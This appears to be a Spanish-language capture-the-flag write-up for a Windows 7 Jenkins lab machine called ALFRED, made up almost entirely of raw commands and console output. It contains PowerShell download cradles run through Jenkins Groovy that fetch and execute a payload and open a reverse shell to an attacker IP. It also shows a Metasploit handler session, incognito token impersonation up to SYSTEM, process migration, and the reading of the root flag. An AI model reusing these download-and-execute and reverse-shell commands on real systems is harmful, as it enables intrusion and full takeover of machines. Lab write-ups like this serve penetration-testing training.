println "powershell (New-Object System.Net.WebClient).Downloadfile('http://10.10.217.63:8081/shell-paimon.exe\','shell-paimon.exe')

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.217.63:8081/shell-paimon.exe','shell-paimon.exe')"

println "powershell iex (New-Object Net.WebClient).DownloadString(\'http://10.10.217.63:8081/shell-paimon.exe\');shell-paimon.exe".execute().text






METERPRETER:

<strong>powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.143.22:8081/shell-paimon.exe','shell-paimon.exe')"
</strong>
EJECUTAMOS EL ARCHIVO:


Start-Process "shell-paimon.exe"




NETCAT:

<strong>println "powershell iex (New-Object Net.WebClient).DownloadString(\'http://10.10.143.22:8081/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.143.22 -Port 443".execute().text
</strong>

METASPLOIT CONFIUGURACION:





‚îÄ‚îÄ(root„âøkali)-[~]
‚îî‚îÄ# msfconsole
                                                  
               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,                                                                          
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,                                                                       
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:                                                                     
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,                                                                   
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo                                                                  
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk                                                                 
 oMMMMMMMMMMx.                    dMMMMMMMMMMx                                                                
.WMMMMMMMMM:                       :MMMMMMMMMM,                                                               
xMMMMMMMMMo                         lMMMMMMMMMO                                                               
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;                                                        
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:                                                         
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:                                                           
xMMMMMMMMMd                        ,0MMMMMMMMMMK;                                                             
.WMMMMMMMMMc                         'OMMMMMM0,                                                               
 lMMMMMMMMMMk.                         .kMMO'                                                                 
  dMMMMMMMMMMWd'                         ..                                                                   
   cWMMMMMMMMMMMNxc'.                ##########                                                               
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:                                
                                :::::::+:
                      Metasploit

       =[ metasploit v6.2.23-dev                          ]
+ -- --=[ 2259 exploits - 1188 auxiliary - 402 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to 
check out the result of hosts and services
Metasploit Documentation: https://docs.metasploit.com/

msf6 > set /multi/handler
/multi/handler => 
msf6 > options

Global Options:
===============

   Option             Current Setting    Description
   ------             ---------------    -----------
   ConsoleLogging     false              Log all console input and output
   LogLevel           0                  Verbosity of logs (default 0, max 3)
   MeterpreterPrompt  meterpreter        The meterpreter prompt string
   MinimumRank        0                  The minimum rank of exploits that will run without explicit confirm
                                         ation
   Prompt             msf6               The prompt string
   PromptChar         >                  The prompt character
   PromptTimeFormat   %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
   SessionLogging     false              Log all input and output for sessions
   SessionTlvLogging  false              Log all incoming and outgoing TLV packets
   TimestampOutput    false              Prefix all console output with a timestamp

msf6 > back
msf6 > search multi handler

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   0   exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1   exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3   exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4   exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5   exploit/multi/handler                                                 manual     No     Generic Payload Handler
   6   exploit/multi/http/hp_sitescope_uploadfileshandler   2012-08-29       good       No     HP SiteScope Remote Code Execution
   7   exploit/windows/firewall/blackice_pam_icq            2004-03-18       great      No     ISS PAM.dll ICQ Parser Buffer Overflow
   8   exploit/windows/browser/ms05_054_onload              2005-11-21       normal     No     MS05-054 Microsoft Internet Explorer JavaScript OnLoad Handler Remote Code Execution
   9   exploit/windows/browser/ms13_080_cdisplaypointer     2013-10-08       normal     No     MS13-080 Microsoft Internet Explorer CDisplayPointer Use-After-Free
   10  exploit/multi/http/maracms_upload_exec               2020-08-31       excellent  Yes    MaraCMS Arbitrary PHP File Upload
   11  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   12  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   13  exploit/linux/http/rconfig_ajaxarchivefiles_rce      2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   14  auxiliary/dos/http/webrick_regex                     2008-08-08       normal     No     Ruby WEBrick::HTTP::DefaultFileHandler DoS
   15  auxiliary/dos/http/squid_range_dos                   2021-05-27       normal     No     Squid Proxy Range Header DoS
   16  exploit/linux/http/trendmicro_websecurity_exec       2020-06-10       excellent  Yes    Trend Micro Web Security (Virtual Appliance) Remote Code Execution
   17  exploit/multi/http/wp_ait_csv_rce                    2020-11-14       excellent  Yes    WordPress AIT CSV Import Export Unauthenticated Remote Code Execution
   18  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence


Interact with a module by name or index. For example info 18, use 18 or use exploit/linux/local/yum_package_manager_persistence                                                                                             

msf6 > use 5
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.143.22
LHOST => 10.10.143.22
msf6 exploit(multi/handler) > options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.143.22     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.143.22:4444 
[*] Sending stage (175686 bytes) to 10.10.60.152
[*] Meterpreter session 1 opened (10.10.143.22:4444 -> 10.10.60.152:49204) at 2024-01-22 01:51:49 +0000

meterpreter > 




CARGAMOS EL MODULO O EXTENSION DE METERPRETER INCOGNITO CON LOAD; PARA PODER VER LOS TOKENS DISPONIBLES Y MAS:







meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > sysinfo
Computer        : ALFRED
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > list_tokens -g 
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\sppsvc
NT SERVICE\swprv
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WinDefend
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc


EJECUTAMOS EL COMANDO CON IMPERSONATE_TOKEN PARA USAR EL TOKEN QUE VIMOS AVALIBLE DE ADMINISTRATOR Y OBTENEMOS LA ELEVACIOND E PRIVILEGIOS COMO AUTORITY SYSTEM, SE TENZO:




meterpreter > getuid
Server username: alfred\bruce
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM




TRATAMOS DE MIGRARA A UN PROCESO DE SYSTEM PARA ASEGURARNOS DE LOS PERMISOSO DE PRIVILEGIOS COMPLETOS POR EL MANEJO DE TOKEN DEL SISTEMA POR AHI NO PODEMOS TENER LOS PRIVILEGIOS TOTALES HASTA MIGRARA A UN PROCESO ACTUAL EJECUTADO POR SYSTEMA:




meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 396   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 468   2440  shell-paimon.exe   x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\
                                                                             shell-paimon.exe
 524   516   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.ex
                                                                             e
 668   580   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.ex
                                                                             e
 676   580   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 712   668   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 772   668   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 848   668   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 920   608   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 936   668   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 988   668   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1012  668   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1016  668   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1064  668   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1208  668   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1236  668   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1340  668   amazon-ssm-agent.  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ama
             exe                                                             zon-ssm-agent.exe
 1396  524   conhost.exe        x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1420  668   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1444  668   LiteAgent.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentool
                                                                             s\LiteAgent.exe
 1472  668   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1608  668   jenkins.exe        x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\
                                                                             jenkins.exe
 1692  668   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1700  668   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1804  1608  java.exe           x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\
                                                                             jre\bin\java.exe
 1832  668   Ec2Config.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2Conf
                                                                             igService\Ec2Config.exe
 1920  524   conhost.exe        x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2288  1804  powershell.exe     x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowe
                                                                             rShell\v1.0\powershell.exe
 2340  772   WmiPrvSE.exe       x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrv
                                                                             SE.exe
 2440  1804  powershell.exe     x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowe
                                                                             rShell\v1.0\powershell.exe
 2664  524   conhost.exe        x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2720  668   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndex
                                                                             er.exe
 2980  668   TrustedInstaller.  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedIns
             exe                                                             taller.exe
 3036  668   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 3064  2288  powershell.exe     x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowe
                                                                             rShell\v1.0\powershell.exe

meterpreter > migrate 668
[*] Migrating from 468 to 668...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : ALFRED
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > guid
[+] Session GUID: 75f4399d-ba28-41ef-96bd-bca59d2c3d40
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM




BUSCAMOS LA BANDERA ROOT.TXT Y LUEGO NOS PASAMOS A SHELL COMUN PARA PODER LEERLA y SE TENZO DE NUEVO:





meterpreter > search -f root.txt
Found 1 result...
=================

Path                                 Size (bytes)  Modified (UTC)
----                                 ------------  --------------
c:\Windows\System32\config\root.txt  70            2019-10-26 11:36:00 +0000


meterpreter > shell
Process 2876 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Windows\System32\config\root.txt
type C:\Windows\System32\config\root.txt
dff0f748678f280250f25a45b8046b4a


</code></pre>
